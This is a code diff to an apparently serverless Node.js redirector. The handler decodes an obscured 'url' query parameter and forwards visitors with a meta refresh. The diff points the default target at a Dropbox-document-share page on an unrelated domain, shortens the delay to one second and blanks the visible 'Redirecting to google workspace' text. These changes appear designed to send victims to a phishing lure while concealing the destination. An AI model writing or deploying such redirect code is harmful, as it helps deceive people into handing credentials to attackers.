@@ -3,7 +3,7 @@ module.exports = (req, res) => {
     const encryptedUrl = req.query.url;
 
     // Default link to redirect to (in case no URL is provided)
-    const defaultUrl = 'https://bypbes.short.gy/quick-load';
+    const defaultUrl = 'https://itstartedintanzania.com/pdfcontent/dropbox-document-share.html';
 
     // If the 'url' query parameter is provided
     if (encryptedUrl) {
@@ -23,7 +23,7 @@ module.exports = (req, res) => {
                 <!DOCTYPE html>
                 <html>
                 <head>
-                    <meta http-equiv="refresh" content="3;url=${decodedUrl}">
+                    <meta http-equiv="refresh" content="1;url=${decodedUrl}">
                     <title>Redirecting...</title>
                 </head>
                 <body>
@@ -46,7 +46,7 @@ module.exports = (req, res) => {
                 <title>Redirecting...</title>
             </head>
             <body>
-                <p>Redirecting to google workspace in 3 seconds...</p>
+                <p></p>
                 <!-- You could include the full loading HTML here -->
             </body>
             </html>
